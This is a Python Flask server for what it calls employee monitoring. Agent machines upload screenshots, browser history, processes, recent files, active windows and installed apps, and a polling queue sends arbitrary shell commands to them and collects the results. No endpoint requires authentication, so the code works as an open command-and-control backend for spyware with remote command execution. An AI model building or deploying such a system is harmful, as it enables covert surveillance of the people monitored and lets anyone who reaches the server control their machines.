#!/usr/bin/env python3
"""
Central Monitoring Server - Multi-Machine Dashboard
Collects data from multiple EmployeeMonitor agents
Works both locally and on cloud (Render.com)

Local:  python3 server.py
Cloud:  gunicorn server:app --bind 0.0.0.0:$PORT
"""

import os
import sys
import json
import logging
import platform
from datetime import datetime, timedelta
from flask import Flask, render_template, jsonify, request, send_file, Response
from collections import defaultdict
import threading
import time
import base64

# Setup logging
LOG_PATH = '/var/log/centralmonitor.log'
if not os.access('/var/log', os.W_OK):
    LOG_PATH = '/tmp/centralmonitor.log'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_PATH),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("server")

# Template folder
TEMPLATE_DIR = '/Library/Application Support/CentralMonitor/templates'
if not os.path.exists(TEMPLATE_DIR):
    TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), 'templates')

# Data storage folder (for local mode)
DATA_DIR = '/var/lib/centralmonitor'
if not os.access('/var', os.W_OK):
    DATA_DIR = os.path.expanduser('~/.centralmonitor')
os.makedirs(DATA_DIR, exist_ok=True)

app = Flask(__name__, template_folder=TEMPLATE_DIR)

# In-memory data store
# Structure: { machine_id: { 'info': {}, 'history': [], 'processes': [], ... } }
machines_data = defaultdict(dict)
machines_lock = threading.RLock()

# Command queue for polling-based remote commands
# Structure: { machine_id: { 'pending': {'id': str, 'command': str}, 'results': {'id': str, ...} } }
command_queue = defaultdict(dict)
command_lock = threading.RLock()

# Heartbeat tracking
HEARTBEAT_TIMEOUT = 60  # seconds

def _get_machine_status_unlocked(machine_id):
    """Check if machine is online (caller must hold machines_lock)"""
    if machine_id not in machines_data:
        return 'offline'
    last_seen = machines_data[machine_id].get('last_heartbeat')
    if not last_seen:
        return 'offline'
    try:
        last_time = datetime.fromisoformat(last_seen)
        if datetime.now() - last_time < timedelta(seconds=HEARTBEAT_TIMEOUT):
            return 'online'
    except:
        pass
    return 'offline'

def get_machine_status(machine_id):
    """Check if machine is online based on last heartbeat (thread-safe)"""
    with machines_lock:
        return _get_machine_status_unlocked(machine_id)

def cleanup_old_machines():
    """Remove machines that haven't sent data in 24 hours"""
    while True:
        time.sleep(3600)  # Run every hour
        with machines_lock:
            cutoff = datetime.now() - timedelta(hours=24)
            to_remove = []
            for machine_id, data in machines_data.items():
                last_seen = data.get('last_heartbeat')
                if last_seen:
                    try:
                        last_time = datetime.fromisoformat(last_seen)
                        if last_time < cutoff:
                            to_remove.append(machine_id)
                    except:
                        pass
            
            for machine_id in to_remove:
                log.info(f"Removing stale machine: {machine_id}")
                del machines_data[machine_id]

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_machines, daemon=True)
cleanup_thread.start()

# ==================== HEALTH CHECK (for UptimeRobot / Render) ====================

@app.route('/health')
def health_check():
    """Health check endpoint for monitoring services"""
    with machines_lock:
        online = sum(1 for mid in machines_data if _get_machine_status_unlocked(mid) == 'online')
        total = len(machines_data)
    return jsonify({
        "status": "healthy",
        "uptime": "ok",
        "agents_total": total,
        "agents_online": online,
        "timestamp": datetime.now().isoformat()
    })

# ==================== API ROUTES FOR AGENTS ====================

@app.route('/agent/register', methods=['POST'])
def agent_register():
    """Agent registration endpoint"""
    data = request.get_json()
    if not data or 'machine_id' not in data:
        return jsonify({"error": "machine_id required"}), 400
    
    machine_id = data['machine_id']
    with machines_lock:
        if machine_id not in machines_data:
            machines_data[machine_id] = {}
            log.info(f"New machine registered: {machine_id}")
        
        machines_data[machine_id]['last_heartbeat'] = datetime.now().isoformat()
        machines_data[machine_id]['hostname'] = data.get('hostname', machine_id)
        machines_data[machine_id]['ip'] = data.get('ip') or request.remote_addr
    
    return jsonify({"success": True, "message": "Registered successfully"})

@app.route('/agent/heartbeat', methods=['POST'])
def agent_heartbeat():
    """Agent heartbeat endpoint"""
    data = request.get_json()
    if not data or 'machine_id' not in data:
        return jsonify({"error": "machine_id required"}), 400
    
    machine_id = data['machine_id']
    with machines_lock:
        if machine_id in machines_data:
            machines_data[machine_id]['last_heartbeat'] = datetime.now().isoformat()
    
    return jsonify({"success": True})

@app.route('/agent/data', methods=['POST'])
def agent_data():
    """Receive data from agents"""
    data = request.get_json()
    if not data or 'machine_id' not in data:
        return jsonify({"error": "machine_id required"}), 400
    
    machine_id = data['machine_id']
    data_type = data.get('type')  # 'info', 'screenshot', 'history', etc.
    payload = data.get('data')
    
    with machines_lock:
        if machine_id not in machines_data:
            machines_data[machine_id] = {}
        
        machines_data[machine_id]['last_heartbeat'] = datetime.now().isoformat()
        
        # Store IP if not already set
        if not machines_data[machine_id].get('ip') or machines_data[machine_id].get('ip') == 'unknown':
            machines_data[machine_id]['ip'] = request.remote_addr
        
        if data_type:
            machines_data[machine_id][data_type] = payload
        
        # If it's a screenshot, store base64 in memory (cloud-compatible)
        if data_type == 'screenshot' and payload:
            machines_data[machine_id]['screenshot_b64'] = payload
            # Also save to file if local
            try:
                screenshot_path = os.path.join(DATA_DIR, f'{machine_id}_screenshot.png')
                with open(screenshot_path, 'wb') as f:
                    f.write(base64.b64decode(payload))
                machines_data[machine_id]['screenshot_path'] = screenshot_path
            except Exception as e:
                log.debug(f"File save skipped for {machine_id}: {e}")
    
    return jsonify({"success": True})

# ==================== POLLING-BASED COMMAND SYSTEM ====================

@app.route('/agent/command/poll', methods=['POST'])
def agent_command_poll():
    """Agent polls for pending commands"""
    data = request.get_json()
    if not data or 'machine_id' not in data:
        return jsonify({"error": "machine_id required"}), 400
    
    machine_id = data['machine_id']
    
    with command_lock:
        pending = command_queue.get(machine_id, {}).get('pending')
        if pending and not pending.get('delivered', False):
            pending['delivered'] = True
            return jsonify({"has_command": True, "command_id": pending['id'], "command": pending['command']})
    
    return jsonify({"has_command": False})

@app.route('/agent/command/result', methods=['POST'])
def agent_command_result():
    """Agent sends back command result"""
    data = request.get_json()
    if not data or 'machine_id' not in data or 'command_id' not in data:
        return jsonify({"error": "machine_id and command_id required"}), 400
    
    machine_id = data['machine_id']
    command_id = data['command_id']
    
    with command_lock:
        # Clear pending
        if machine_id in command_queue:
            command_queue[machine_id].pop('pending', None)
        
        # Store result
        if machine_id not in command_queue:
            command_queue[machine_id] = {}
        command_queue[machine_id]['result'] = {
            'id': command_id,
            'success': data.get('success', False),
            'output': data.get('output', ''),
            'error': data.get('error', ''),
            'timestamp': datetime.now().isoformat()
        }
    
    return jsonify({"success": True})

# ==================== DASHBOARD ROUTES ====================

@app.route('/')
def dashboard():
    """Central dashboard"""
    return render_template('central_dashboard.html')

@app.route('/api/machines')
def api_machines():
    """Get list of all registered machines"""
    with machines_lock:
        machine_list = []
        for machine_id, data in machines_data.items():
            machine_list.append({
                'id': machine_id,
                'hostname': data.get('hostname', machine_id),
                'ip': data.get('ip', 'unknown'),
                'status': _get_machine_status_unlocked(machine_id),
                'last_seen': data.get('last_heartbeat', 'never')
            })
    
    return jsonify(machine_list)

@app.route('/api/machine/<machine_id>/info')
def api_machine_info(machine_id):
    """Get system info for specific machine"""
    with machines_lock:
        if machine_id not in machines_data:
            return jsonify({"error": "Machine not found"}), 404
        
        info = machines_data[machine_id].get('info', {})
        info['status'] = _get_machine_status_unlocked(machine_id)
        info['last_heartbeat'] = machines_data[machine_id].get('last_heartbeat')
        return jsonify(info)

@app.route('/api/machine/<machine_id>/screenshot')
def api_machine_screenshot(machine_id):
    """Get screenshot for specific machine"""
    with machines_lock:
        if machine_id not in machines_data:
            return jsonify({"error": "Machine not found"}), 404
        
        # Try base64 from memory first (works on cloud)
        b64_data = machines_data[machine_id].get('screenshot_b64')
        if b64_data:
            try:
                img_bytes = base64.b64decode(b64_data)
                return Response(img_bytes, mimetype='image/png',
                                headers={'Cache-Control': 'no-cache, no-store'})
            except:
                pass
        
        # Fallback to file (local mode)
        screenshot_path = machines_data[machine_id].get('screenshot_path')
        if screenshot_path and os.path.exists(screenshot_path):
            return send_file(screenshot_path, mimetype='image/png', max_age=0)
    
    return jsonify({"error": "Screenshot not available"}), 404

@app.route('/api/machine/<machine_id>/history')
def api_machine_history(machine_id):
    """Get browser history for specific machine"""
    with machines_lock:
        if machine_id not in machines_data:
            return jsonify({"error": "Machine not found"}), 404
        return jsonify(machines_data[machine_id].get('history', []))

@app.route('/api/machine/<machine_id>/processes')
def api_machine_processes(machine_id):
    """Get running processes for specific machine"""
    with machines_lock:
        if machine_id not in machines_data:
            return jsonify({"error": "Machine not found"}), 404
        return jsonify(machines_data[machine_id].get('processes', []))

@app.route('/api/machine/<machine_id>/files')
def api_machine_files(machine_id):
    """Get recent files for specific machine"""
    with machines_lock:
        if machine_id not in machines_data:
            return jsonify({"error": "Machine not found"}), 404
        return jsonify(machines_data[machine_id].get('files', []))

@app.route('/api/machine/<machine_id>/network')
def api_machine_network(machine_id):
    """Get network info for specific machine"""
    with machines_lock:
        if machine_id not in machines_data:
            return jsonify({"error": "Machine not found"}), 404
        return jsonify(machines_data[machine_id].get('network', {}))

@app.route('/api/machine/<machine_id>/active_window')
def api_machine_active_window(machine_id):
    """Get active window for specific machine"""
    with machines_lock:
        if machine_id not in machines_data:
            return jsonify({"error": "Machine not found"}), 404
        return jsonify(machines_data[machine_id].get('active_window', {}))

@app.route('/api/machine/<machine_id>/apps')
def api_machine_apps(machine_id):
    """Get installed apps for specific machine"""
    with machines_lock:
        if machine_id not in machines_data:
            return jsonify({"error": "Machine not found"}), 404
        return jsonify(machines_data[machine_id].get('apps', []))

@app.route('/api/stats')
def api_stats():
    """Get overall statistics"""
    with machines_lock:
        online = sum(1 for mid in machines_data.keys() if _get_machine_status_unlocked(mid) == 'online')
        total = len(machines_data)
    
    return jsonify({
        'total_machines': total,
        'online_machines': online,
        'offline_machines': total - online
    })

@app.route('/api/network/scan')
def api_network_scan():
    """Scan ARP table and network to discover active devices, hostnames, and IP addresses"""
    devices = []
    seen_ips = set()
    
    # 1. First include all registered agent machines
    with machines_lock:
        for mid, mdata in machines_data.items():
            ip = mdata.get('ip')
            if ip and ip != 'unknown':
                seen_ips.add(ip)
                devices.append({
                    'ip': ip,
                    'hostname': mdata.get('hostname', mid),
                    'mac': 'Registered Agent',
                    'type': 'Agent Machine',
                    'agent_installed': True,
                    'status': _get_machine_status_unlocked(mid),
                    'machine_id': mid
                })
                
    # 2. Parse ARP cache table
    try:
        import subprocess, re
        arp_out = subprocess.check_output(['arp', '-a'], stderr=subprocess.DEVNULL, timeout=5).decode(errors='replace')
        for line in arp_out.splitlines():
            match = re.search(r'([^\s\(\)]+)?\s*\(([\d\.]+)\)\s*at\s*([a-fA-F0-9:]+)', line)
            if match:
                h_name = match.group(1) or 'Unknown Device'
                if h_name == '?': h_name = 'Unknown Device'
                ip_addr = match.group(2)
                mac_addr = match.group(3)
                
                if ip_addr not in seen_ips and not ip_addr.startswith('255.') and not ip_addr.startswith('224.'):
                    seen_ips.add(ip_addr)
                    devices.append({
                        'ip': ip_addr,
                        'hostname': h_name,
                        'mac': mac_addr,
                        'type': 'Network Device',
                        'agent_installed': False,
                        'status': 'discovered'
                    })
    except Exception as e:
        log.debug(f"ARP scan exception: {e}")
        
    return jsonify({
        'total_devices': len(devices),
        'devices': devices,
        'scan_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

# ==================== CLOUD-COMPATIBLE COMMAND SYSTEM ====================

@app.route('/api/machine/<machine_id>/command', methods=['POST'])
def api_machine_command(machine_id):
    """Queue command for agent (polling-based, works on cloud)"""
    data = request.get_json()
    if not data or 'command' not in data:
        return jsonify({"error": "command required"}), 400
    
    cmd = data['command'].strip()
    if not cmd:
        return jsonify({"error": "empty command"}), 400
    
    # Generate unique command ID
    import uuid
    command_id = str(uuid.uuid4())[:8]
    
    with command_lock:
        if machine_id not in command_queue:
            command_queue[machine_id] = {}
        
        # Queue the command
        command_queue[machine_id]['pending'] = {
            'id': command_id,
            'command': cmd,
            'queued_at': datetime.now().isoformat()
        }
        # Clear old result
        command_queue[machine_id].pop('result', None)
    
    log.info(f"Command queued for {machine_id}: {cmd} (id={command_id})")
    return jsonify({"success": True, "command_id": command_id, "message": "Command queued, waiting for agent..."})

@app.route('/api/machine/<machine_id>/command/status/<command_id>')
def api_command_status(machine_id, command_id):
    """Check if command result is ready"""
    with command_lock:
        queue = command_queue.get(machine_id, {})
        
        # Check if result is available
        result = queue.get('result')
        if result and result.get('id') == command_id:
            return jsonify({"ready": True, "result": result})
        
        # Still pending?
        pending = queue.get('pending')
        if pending and pending.get('id') == command_id:
            if pending.get('delivered'):
                return jsonify({"ready": False, "status": "running", "message": "Command is executing on the agent..."})
            return jsonify({"ready": False, "status": "waiting", "message": "Agent hasn't picked up command yet..."})
    
    return jsonify({"ready": False, "status": "unknown", "message": "Command not found"})

# ==================== STARTUP ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    log.info("=" * 60)
    log.info("  🖥️  Central Monitoring Server Starting")
    log.info("=" * 60)
    log.info(f"  🌐 Dashboard: http://0.0.0.0:{port}")
    log.info(f"  📁 Data Dir: {DATA_DIR}")
    log.info(f"  📋 Logs: {LOG_PATH}")
    log.info("=" * 60)
    
    if sys.stdout.isatty():
        print(f"\n{'='*60}")
        print(f"  🖥️  Central Monitoring Server Started")
        print(f"{'='*60}")
        print(f"  🌐 Dashboard: http://0.0.0.0:{port}")
        print(f"  📁 Data Directory: {DATA_DIR}")
        print(f"  📋 Logs: {LOG_PATH}")
        print(f"{'='*60}\n")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        threaded=True,
        use_reloader=False
    )
